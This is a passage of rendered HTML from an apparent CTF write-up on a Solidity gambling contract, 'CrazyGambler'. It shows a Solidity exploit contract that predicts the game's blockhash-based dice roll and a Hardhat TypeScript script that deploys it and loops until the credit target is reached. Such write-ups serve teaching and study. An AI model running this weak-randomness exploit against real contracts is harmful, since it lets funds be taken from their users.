</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#6a9955">// Using the same function</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_rollDice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> internal view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>        uint256 blockNo </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">number</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>        uint256 diceRes </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">blockhash</span><span class="token" style="color:#d4d4d4">(</span><span>blockNo</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">%</span><span> </span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> diceRes</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span>    </span><span class="token" style="color:#6a9955">//</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">initThing</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>        crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">trialCredit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span>        crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">trialCredit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">tryToSolve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span>  </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span>        uint256 res </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">_rollDice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span><span>        </span><span class="token" style="color:#6a9955">// The same check as in gamble</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>res </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span><span>            crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">gamble</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span><span>        </span><span class="token" style="color:#6a9955">// Here to keep track of our progress</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span>        uint256 currentCredit </span><span class="token" style="color:#d4d4d4">=</span><span> crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">gamblersCredit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span><span>        </span><span class="token" style="color:#6a9955">// Emitting an event is like announcing something. It&#x27;s really good</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span><span>        </span><span class="token" style="color:#6a9955">// to inform off-chain parties of on-chain updates</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span><span>        emit </span><span class="token" style="color:#dcdcaa">Gamble</span><span class="token" style="color:#d4d4d4">(</span><span>currentCredit</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">I used both <code class="inline-code">hardhat</code> and <code class="inline-code">foundry</code> for scripting the exploit. We need to call the function tryToSolve till we get to 20.
, but I will share the <code class="inline-code">hardhat</code> one because it&#x27;s easier to understand as it&#x27;s javascript code. ( well I write in Typescript. Can&#x27;t live without type safety )</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token"> ethers</span><span class="token" style="color:#d4d4d4">,</span><span class="token"> getNamedAccounts </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;hardhat&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token"> </span><span class="token" style="color:#9cdcfe">CrazyGambler</span><span class="token" style="color:#d4d4d4">,</span><span class="token"> </span><span class="token" style="color:#9cdcfe">ExploitContract</span><span class="token"> </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../typechain-types&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token literal-property" style="color:#9cdcfe">crazyGambler</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#4ec9b0">CrazyGambler</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token literal-property" style="color:#9cdcfe">exploitContract</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#4ec9b0">ExploitContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token literal-property" style="color:#9cdcfe">deployer</span><span class="token" style="color:#d4d4d4">:</span><span> string</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token function-variable" style="color:#dcdcaa">setUp</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#6a9955">// Getting my private key</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    deployer </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getNamedAccounts</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">deployer</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    </span><span class="token" style="color:#6a9955">// Getting the crazy gambler&#x27;s address</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> crazyGamblerAddress </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0x55409Be51f453acCDbab41c439545FA317C0508b&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#6a9955">// Uncomment to use for deploy a contract and start the exploit</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>    crazyGambler </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> ethers</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getContractAt</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;CrazyGambler&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> crazyGamblerAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>    </span><span class="token" style="color:#6a9955">// Deploying my exploit contract</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> exploitContractFactory </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> ethers</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getContractFactory</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;ExploitContract&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> tx </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> exploitContractFactory</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">deploy</span><span class="token" style="color:#d4d4d4">(</span><span>crazyGamblerAddress</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>    exploitContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">deployed</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span>    </span><span class="token" style="color:#6a9955">//  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>    </span><span class="token" style="color:#6a9955">// exploitContract = await ethers.getContractAt(&quot;ExploitContract&quot;, &quot;0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3&quot;);</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;deployed exploit contract&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span> exploitContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token function-variable" style="color:#dcdcaa">solve</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> solved </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span><span>    </span><span class="token" style="color:#6a9955">// Uncomment that when you are using the contract for the first time</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span><span>    </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> exploitContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">initThing</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token literal-property" style="color:#9cdcfe">gasLimit</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">300000</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">wait</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span>    </span><span class="token" style="color:#6a9955">// Keeping track of the balance</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> currentBalance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">gamblersCredit</span><span class="token" style="color:#d4d4d4">(</span><span>exploitContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;current balance&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span> currentBalance</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span>    </span><span class="token" style="color:#c586c0">while</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>solved</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span><span>        </span><span class="token" style="color:#c586c0">try</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">43</span><span>            </span><span class="token" style="color:#569CD6">const</span><span> res </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> exploitContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">tryToSolve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token literal-property" style="color:#9cdcfe">gasLimit</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">300000</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">wait</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">44</span><span>            </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span>res </span><span class="token" style="color:#c586c0">as</span><span> any</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">?.</span><span>events</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">?.</span><span>args</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">45</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">46</span><span>        </span><span class="token" style="color:#c586c0">catch</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>error</span><span class="token" style="color:#d4d4d4">:</span><span> any</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">47</span><span>            </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>error</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">message</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">48</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">49</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">50</span>
